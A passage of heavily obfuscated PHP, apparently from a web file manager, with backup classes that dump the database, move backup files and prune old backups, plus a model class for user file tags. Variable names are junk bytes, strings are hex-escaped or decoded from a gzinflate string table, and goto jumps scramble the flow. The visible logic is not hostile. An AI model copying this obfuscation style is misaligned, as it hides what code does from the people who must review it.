intval($ƒŸšĞˆ); self::$manual = $ƒŸšĞˆ && $ƒŸšĞˆ == 1 ? 1 : 0; } private function initData($ê„½û° = 0, $Øµ¦¿×÷ = '') { $ÒÇˆº»º =& $_SERVER[­á Ş³Ö]; $ˆ«Á¸ú± = Model($ÒÇˆº»º[745])->config(); if ($Øµ¦¿×÷ && $ˆ«Á¸ú±[$ÒÇˆº»º[748]] != $Øµ¦¿×÷) { $ê„½û° = 0; } $this->checkStore($ˆ«Á¸ú±[$ÒÇˆº»º[748]]); if (self::$manual == 1) { self::$name .= $ÒÇˆº»º[11] . date($ÒÇˆº»º[750]); } $ÇŠ«Î¿Ñ = array($ÒÇˆº»º[748] => $ˆ«Á¸ú±[$ÒÇˆº»º[748]], $ÒÇˆº»º[32] => self::$name, $ÒÇˆº»º[746] => 0, $ÒÇˆº»º[751] => $ˆ«Á¸ú±[$ÒÇˆº»º[751]], $ÒÇˆº»º[752] => self::$manual, $ÒÇˆº»º[293] => array($ÒÇˆº»º[753] => array($ÒÇˆº»º[746] => 0), $ÒÇˆº»º[754] => array($ÒÇˆº»º[746] => 0, $ÒÇˆº»º[755] => 0, $ÒÇˆº»º[756] => 0, $ÒÇˆº»º[33] => $ÒÇˆº»º[12], $ÒÇˆº»º[757] => 0, $ÒÇˆº»º[758] => 0), $ÒÇˆº»º[759] => array($ÒÇˆº»º[746] => 0, $ÒÇˆº»º[755] => 0, $ÒÇˆº»º[756] => 0, $ÒÇˆº»º[757] => 0, $ÒÇˆº»º[758] => 0), $ÒÇˆº»º[200] => array($ÒÇˆº»º[746] => 0, $ÒÇˆº»º[760] => 0, $ÒÇˆº»º[761] => 0, $ÒÇˆº»º[762] => 0, $ÒÇˆº»º[763] => 0, $ÒÇˆº»º[468] => $ê„½û°, $ÒÇˆº»º[757] => 0, $ÒÇˆº»º[758] => 0)), $ÒÇˆº»º[757] => time(), $ÒÇˆº»º[758] => 0); $áÆíƒŸê = Model($ÒÇˆº»º[745])->insert($ÇŠ«Î¿Ñ); $ÇŠ«Î¿Ñ[$ÒÇˆº»º[399]] = $áÆíƒŸê; return $ÇŠ«Î¿Ñ; } private function checkStore($¥Ëœõ˜÷) { $ùıÉêı¤ =& $_SERVER[­á Ş³Ö]; $ØÖµñïÒ = Model($ùıÉêı¤[764])->listData($¥Ëœõ˜÷); Model($ùıÉêı¤[764])->checkConfig($ØÖµñïÒ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[­á Ş³Ö][745])->findByName(self::$name); } return self::$option; } public static function set($¯Ü­‹»‹) { $´ÄÏó =& $_SERVER[­á Ş³Ö]; $ŞûÜ¼ß = self::get(); foreach ($¯Ü­‹»‹ as $²ƒùÄ²ğ => $“…Ğ”øı) { $æË‚ª´ = explode($´ÄÏó[10], $²ƒùÄ²ğ); $ç†¡ïÃø = count($æË‚ª´); switch ($ç†¡ïÃø) { case 1: $ŞûÜ¼ß[$æË‚ª´[0]] = $“…Ğ”øı; break; case 2: $ŞûÜ¼ß[$æË‚ª´[0]][$æË‚ª´[1]] = $“…Ğ”øı; break; case 3: $ŞûÜ¼ß[$æË‚ª´[0]][$æË‚ª´[1]][$æË‚ª´[2]] = $“…Ğ”øı; break; } } Model($´ÄÏó[745])->update($ŞûÜ¼ß[$´ÄÏó[399]], $ŞûÜ¼ß); self::$option = $ŞûÜ¼ß; return self::$option; } public function keep() { $²ø…×Ğ® =& $_SERVER[­á Ş³Ö]; $å¢­È³Ì = self::get(); if ($å¢­È³Ì[$²ø…×Ğ®[293]][$²ø…×Ğ®[753]][$²ø…×Ğ®[746]] == $²ø…×Ğ®[88]) { return; } $this->backupKeep($å¢­È³Ì); self::set(array($²ø…×Ğ®[765] => 1)); } private function backupKeep($ö‹ôåÚÃ) { $Ÿê¤ÎÊÂ =& $_SERVER[­á Ş³Ö]; if (self::$manual == 1) { return; } $½ôË«Íã = Model($Ÿê¤ÎÊÂ[745])->listData(); if (empty($½ôË«Íã)) { return; } $»Øûûƒú = 0; $Ëı–˜¤Ñ = array(); foreach ($½ôË«Íã as $â¤àİ¸Ì) { if ($»Øûûƒú >= 7) { break; } $Ëı–˜¤Ñ[] = $â¤àİ¸Ì[$Ÿê¤ÎÊÂ[32]]; $»Øûûƒú++; } for ($»Øûûƒú = 0; $»Øûûƒú < 12; $»Øûûƒú++) { $Ëı–˜¤Ñ[] = date($Ÿê¤ÎÊÂ[766], strtotime("\x2d{$»Øûûƒú}\40\155\x6f\x6e\164\x68\x73")); } $Ëı–˜¤Ñ = array_unique($Ëı–˜¤Ñ); $ŒÙŸïà€ = Model($Ÿê¤ÎÊÂ[767])->get($Ÿê¤ÎÊÂ[768]); foreach ($½ôË«Íã as $â¤àİ¸Ì) { if (isset($â¤àİ¸Ì[$Ÿê¤ÎÊÂ[752]]) && $â¤àİ¸Ì[$Ÿê¤ÎÊÂ[752]] == $Ÿê¤ÎÊÂ[88]) { continue; } if (!empty($â¤àİ¸Ì[$Ÿê¤ÎÊÂ[32]]) && in_array($â¤àİ¸Ì[$Ÿê¤ÎÊÂ[32]], $Ëı–˜¤Ñ)) { continue; } Model($Ÿê¤ÎÊÂ[745])->remove($â¤àİ¸Ì[$Ÿê¤ÎÊÂ[399]]); $’Ø‘ıà© = $this->backupPath($ö‹ôåÚÃ, $ŒÙŸïà€); IO::remove($’Ø‘ıà©, !1); } } private function backupPath($´Œ”´ËÊ, $÷˜ê™Šı = false) { $©ÔÉĞ¦Ì =& $_SERVER[­á Ş³Ö]; if (!$÷˜ê™Šı) { $÷˜ê™Šı = Model($©ÔÉĞ¦Ì[767])->get($©ÔÉĞ¦Ì[768]); } $ö‹€ïË = $´Œ”´ËÊ[$©ÔÉĞ¦Ì[32]]; $Úè’ã›Ÿ = substr(md5($©ÔÉĞ¦Ì[769] . $÷˜ê™Šı . $ö‹€ïË), 0, 8); return "\173\x69\157\x3a{$´Œ”´ËÊ[$©ÔÉĞ¦Ì[748]]}\175\x2f\144\141\x74\x61\142\x61\x73\x65\x2f\142\x61\x63\x6b\x75\160\57" . $ö‹€ïË . $©ÔÉĞ¦Ì[11] . $Úè’ã›Ÿ; } public function db() { $³†Ğ¢ô¤ =& $_SERVER[­á Ş³Ö]; $è¬áÇ­ø = self::get(); if ($è¬áÇ­ø[$³†Ğ¢ô¤[293]][$³†Ğ¢ô¤[754]][$³†Ğ¢ô¤[746]] == $³†Ğ¢ô¤[88]) { return !0; } $åûïµšï = new BackupDb(); if (!$åûïµšï->index()) { return !1; } self::set(array($³†Ğ¢ô¤[770] => 1)); return !0; } public function dbFile() { $ÑÚšæ‹Š =& $_SERVER[­á Ş³Ö]; $çÓ™›ªÑ = self::get(); if ($çÓ™›ªÑ[$ÑÚšæ‹Š[293]][$ÑÚšæ‹Š[759]][$ÑÚšæ‹Š[746]] == $ÑÚšæ‹Š[88]) { return !0; } $¨Íê“Ş = new BackupDbFile(); if (!$¨Íê“Ş->index()) { return !1; } self::set(array($ÑÚšæ‹Š[771] => 1)); return !0; } public function file() { $ª©À‘Ù =& $_SERVER[­á Ş³Ö]; $ÔÙ­ğÎ§ = self::get(); if ($ÔÙ­ğÎ§[$ª©À‘Ù[293]][$ª©À‘Ù[200]][$ª©À‘Ù[746]] == $ª©À‘Ù[88]) { return !0; } if (!isset($ÔÙ­ğÎ§[$ª©À‘Ù[751]]) || $ÔÙ­ğÎ§[$ª©À‘Ù[751]] == $ª©À‘Ù[198]) { $ÑŒêä = new BackupFile(); if (!$ÑŒêä->index()) { return !1; } } self::set(array($ª©À‘Ù[772] => 1, $ª©À‘Ù[746] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÆÉ™‰çü =& $_SERVER[­á Ş³Ö]; $¼¾­İ°µ = Backup::get(); self::$io = $¼¾­İ°µ[$ÆÉ™‰çü[748]]; self::$name = $¼¾­İ°µ[$ÆÉ™‰çü[32]]; $°ÏÆ²£¯ = new DbManage(); $Ş¥Úì§ = $°ÏÆ²£¯->dbType(); $õú÷¾á˜ = array($ÆÉ™‰çü[773] => $Ş¥Úì§, $ÆÉ™‰çü[774] => time()); Backup::set($õú÷¾á˜); $óúá™ãœ = $this->tmpFilesPath() . $ÆÉ™‰çü[775] . self::$name . $ÆÉ™‰çü[8]; del_dir($óúá™ãœ); mk_dir($óúá™ãœ); $†Öı‘ = $æú¤·ƒ× = 0; $ñç­ñì¾ = new Task($ÆÉ™‰çü[776], $ÆÉ™‰çü[777], 0, LNG($ÆÉ™‰çü[778]) . $ÆÉ™‰çü[779] . LNG($ÆÉ™‰çü[780])); try { $›¡½Ö×‰ = $°ÏÆ²£¯->db()->getTables(); } catch (Exception $©¦»Ù£Ñ) { $ñç­ñì¾->end(); return !1; } $›¡½Ö×‰ = array_diff($›¡½Ö×‰, array($ÆÉ™‰çü[781], $ÆÉ™‰çü[782])); foreach ($›¡½Ö×‰ as $À±¯é’¾) { $†Öı‘ += $°ÏÆ²£¯->model($À±¯é’¾)->count(); } $ñç­ñì¾->task[$ÆÉ™‰çü[783]] = $†Öı‘; $GLOBALS[$ÆÉ™‰çü[784]] = self::$name; foreach ($›¡½Ö×‰ as $À±¯é’¾) { $­Œ¤°Ëœ = $óúá™ãœ . $À±¯é’¾ . $ÆÉ™‰çü[785]; $·˜öëĞ¡ = null; if ($À±¯é’¾ == $ÆÉ™‰çü[786] && (!isset($¼¾­İ°µ[$ÆÉ™‰çü[751]]) || $¼¾­İ°µ[$ÆÉ™‰çü[751]] == $ÆÉ™‰çü[198])) { $·˜öëĞ¡ = self::$io; } $æú¤·ƒ× += $°ÏÆ²£¯->sqlFromDb($À±¯é’¾, $­Œ¤°Ëœ, $ñç­ñì¾, $·˜öëĞ¡); } unset($GLOBALS[$ÆÉ™‰çü[784]]); $ñç­ñì¾->end(); if ($æú¤·ƒ× > $†Öı‘) { $†Öı‘ = $æú¤·ƒ×; } $õú÷¾á˜ = array($ÆÉ™‰çü[773] => $Ş¥Úì§, $ÆÉ™‰çü[770] => 1, $ÆÉ™‰çü[787] => $†Öı‘, $ÆÉ™‰çü[788] => $æú¤·ƒ×, $ÆÉ™‰çü[789] => time()); Backup::set($õú÷¾á˜); if ($†Öı‘ - $æú¤·ƒ× > 0) { $Áœ¢ˆÑ´ = $ÆÉ™‰çü[790]; if (stristr(I18n::getType(), $ÆÉ™‰çü[791])) { $Áœ¢ˆÑ´ = $ÆÉ™‰çü[792]; } write_log(array($Áœ¢ˆÑ´, $õú÷¾á˜), $ÆÉ™‰çü[777]); return !1; } return !0; } private function tmpFilesPath() { $¤ÅÒò‘£ =& $_SERVER[­á Ş³Ö]; $•ºÊ‰•› = TEMP_FILES; if ($GLOBALS[$¤ÅÒò‘£[6]][$¤ÅÒò‘£[89]][$¤ÅÒò‘£[793]]) { $•ºÊ‰•› = $GLOBALS[$¤ÅÒò‘£[6]][$¤ÅÒò‘£[89]][$¤ÅÒò‘£[793]]; if (!mk_dir($•ºÊ‰•›) || !is_writable($•ºÊ‰•›) || !IO::mkfile($•ºÊ‰•› . $¤ÅÒò‘£[794])) { $•ºÊ‰•› = TEMP_FILES; } } return $•ºÊ‰•›; } } class BackupDbFile { public function __construct() { } public function index() { $‡îÔĞÏ =& $_SERVER[­á Ş³Ö]; $†Ââ¹äŠ = Backup::get(); $ÈıèÅ¥ = $†Ââ¹äŠ[$‡îÔĞÏ[32]]; $Û¨ß¯õ = $this->tmpFilesPath() . "\142\x61\143\x6b\165\160\137{$ÈıèÅ¥}\57"; $ï¢ç ŞÊ = $this->backupPath($†Ââ¹äŠ); if (!($ï¢ç ŞÊ = IO::mkdir($ï¢ç ŞÊ))) { return !1; } $¢£öÎñš = IO::listPath($Û¨ß¯õ); $¶«®şıœ = isset($¢£öÎñš[$‡îÔĞÏ[83]]) ? $¢£öÎñš[$‡îÔĞÏ[83]] : array(); $•ùˆóÈ› = array_sum(array_column($¶«®şıœ, $‡îÔĞÏ[76])); if (!$•ùˆóÈ›) { return !1; } $°¾¨—ç = array($‡îÔĞÏ[795] => $•ùˆóÈ›, $‡îÔĞÏ[796] => time()); Backup::set($°¾¨—ç); $Àê–ƒÌ = new TaskFileTransfer($‡îÔĞÏ[797], $‡îÔĞÏ[777], count($¶«®şıœ), LNG($‡îÔĞÏ[778]) . $‡îÔĞÏ[386] . LNG($‡îÔĞÏ[780]) . $‡îÔĞÏ[798]); $Àê–ƒÌ->task[$‡îÔĞÏ[760]] = $•ùˆóÈ›; foreach ($¢£öÎñš[$‡îÔĞÏ[83]] as $ß‚ÎŞŸ) { $ğ¾ÜÍÑ = IO::move($ß‚ÎŞŸ[$‡îÔĞÏ[84]], $ï¢ç ŞÊ); if (!$ğ¾ÜÍÑ) { $Àê–ƒÌ->end(); $è»´“¬¢ = IO::getLastError($‡îÔĞÏ[799] . $ß‚ÎŞŸ[$‡îÔĞÏ[84]] . $‡îÔĞÏ[800] . $ï¢ç ŞÊ . $‡îÔĞÏ[164]); write_log($è»´“¬¢, $‡îÔĞÏ[777]); return !1; } } $ÉËÅŸ† = new DbManage(); $—ß„É›˜ = $ÉËÅŸ†->getSqlFile(); if (!$—ß„É›˜[$‡îÔĞÏ[801]] || !$—ß„É›˜[$‡îÔĞÏ[13]]) { return !1; } IO::move($—ß„É›˜[$‡îÔĞÏ[801]], $ï¢ç ŞÊ); IO::move($—ß„É›˜[$‡îÔĞÏ[13]], $ï¢ç ŞÊ); $Àê–ƒÌ->end(); $°¾¨—ç = array($‡îÔĞÏ[802] => $•ùˆóÈ›, $‡îÔĞÏ[803] => time()); Backup::set($°¾¨—ç); return !0; } private function backupPath($Éª¨œ÷œ) { $Û‰ñÔ™º =& $_SERVER[­á Ş³Ö]; $’»üÑåØ = $Éª¨œ÷œ[$Û‰ñÔ™º[32]]; $¢şÜ›ì = Model($Û‰ñÔ™º[767])->get($Û‰ñÔ™º[768]); $¡¼¥†ìÍ = substr(md5($Û‰ñÔ™º[769] . $¢şÜ›ì . $’»üÑåØ), 0, 8); return "\173\151\x6f\x3a{$Éª¨œ÷œ[$Û‰ñÔ™º[748]]}\x7d\57\x64\x61\x74\141\142\x61\x73\x65\57\x62\x61\x63\x6b\x75\x70\57" . $’»üÑåØ . $Û‰ñÔ™º[11] . $¡¼¥†ìÍ; } private function tmpFilesPath() { $áÄôì¢ =& $_SERVER[­á Ş³Ö]; $‰„¦şÛê = TEMP_FILES; if ($GLOBALS[$áÄôì¢[6]][$áÄôì¢[89]][$áÄôì¢[793]]) { $‰„¦şÛê = $GLOBALS[$áÄôì¢[6]][$áÄôì¢[89]][$áÄôì¢[793]]; if (!mk_dir($‰„¦şÛê) || !is_writable($‰„¦şÛê) || !IO::mkfile($‰„¦şÛê . $áÄôì¢[794])) { $‰„¦şÛê = TEMP_FILES; } } return $‰„¦şÛê; } } goto d„ˆ ™ãŞƒ; BçîÅß¿ù›: define($_SERVER[­á Ş³Ö][0], $_SERVER[­á Ş³Ö][1]); $_SERVER[œÂªÈ¸Ù] = explode($_SERVER[­á Ş³Ö][2], gzinflate(substr($_SERVER[­á Ş³Ö][3], 10, -8))); function binCheckEq($’Ì…»êæ, $ÁÏ£òÎç) { return $’Ì…»êæ == $ÁÏ£òÎç; } goto e¬ê¯ªÌÖÚ; f¨ƒ‡š„Ù: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($Å€½¬«ú) { $õ›Ó¶Íë =& $_SERVER[­á Ş³Ö]; return array($õ›Ó¶Íë[1963] => array($õ›Ó¶Íë[2347] . USER_ID, $õ›Ó¶Íë[1964])); } protected function listData() { $‚É”ºÉ =& $_SERVER[­á Ş³Ö]; $Ä™‘¤‡± = array($‚É”ºÉ[1654] => USER_ID, $‚É”ºÉ[483] => array($‚É”ºÉ[1967], 0)); $Æàó‹á¯ = $‚É”ºÉ[2348]; $ÅùÛÎ³• = $this->field($Æàó‹á¯)->where($Ä™‘¤‡±)->order($‚É”ºÉ[1970])->select(); return $ÅùÛÎ³• ? $ÅùÛÎ³• : array(); } protected function addToTag($²š“–ï, $å¤ü ¼Ï) { $£ÎË™¹„ =& $_SERVER[­á Ş³Ö]; if (!Model($£ÎË™¹„[2111])->listData($å¤ü ¼Ï)) { return !1; } if (is_numeric($²š“–ï)) { $©Š–Ìİë = Model($£ÎË™¹„[822])->pathInfo($²š“–ï); if (!$©Š–Ìİë) { return !1; } } else { $©Š–Ìİë = IO::infoSimple($²š“–ï); if (!$©Š–Ìİë) { return !1; } $°´â²¾ = $©Š–Ìİë[$£ÎË™¹„[32]]; $—ĞêÄŒä = $©Š–Ìİë[$£ÎË™¹„[33]]; if (isset($©Š–Ìİë[$£ÎË™¹„[410]])) { $—ĞêÄŒä = $©Š–Ìİë[$£ÎË™¹„[410]] == $£ÎË™¹„[88] ? $£ÎË™¹„[75] : $£ÎË™¹„[200]; } } $âä¡«æ­ = array($£ÎË™¹„[1654] => USER_ID, $£ÎË™¹„[483] => $å¤ü ¼Ï, $£ÎË™¹„[421] => $²š“–ï, $£ÎË™¹„[422] => $—ĞêÄŒä ? $—ĞêÄŒä : $£ÎË™¹„[416], $£ÎË™¹„[420] => $°´â²¾ ? $°´â²¾ : $£ÎË™¹„[12], $£ÎË™¹„[1856] => 0); if ($this->where($âä¡«æ­)->find()) { return !1; } return $this->add($âä¡«æ­); } protected function removeFromTag($ªÕÉ½·Š, $çºƒ˜ß) { $ƒ³¿›ï =& $_SERVER[­á Ş³Ö]; if (!Model($ƒ³¿›ï[2111])->listData($çºƒ˜ß)) { return !1; } if (is_array($ªÕÉ½·Š)) { $ªÕÉ½·Š = array($ƒ³¿›ï[7], $ªÕÉ½·Š); } $•×Ö®Õì = array($ƒ³¿›ï[1654] => USER_ID, $ƒ³¿›ï[483] => $çºƒ˜ß, $ƒ³¿›ï[421] => $ªÕÉ½·Š); return $this->where($•×Ö®Õì)->delete(); } protected function removeByTag($©¿Ñú¯) { $³í¶˜ =& $_SERVER[­á Ş³Ö]; if (!$©¿Ñú¯) { return !1; } $İîØ‡Ä = array($³í¶˜[1654] => USER_ID, $³í¶˜[483] => $©¿Ñú¯); return $this->where($İîØ‡Ä)->delete(); } protected function removeBySource($ó†Ä¶ˆ¨) { $£–æª§ü =& $_SERVER[­á Ş³Ö]; if (is_array($ó†Ä¶ˆ¨)) { $ó†Ä¶ˆ¨ = array($£–æª§ü[7], $ó†Ä¶ˆ¨); } $“‚ç˜Â = array($£–æª§ü[1654] => USER_ID, $£–æª§ü[483] => array($£–æª§ü[1010], 0), $£–æª§ü[421] => $ó†Ä¶ˆ¨); return $this->where($“‚ç˜Â)->delete(); } }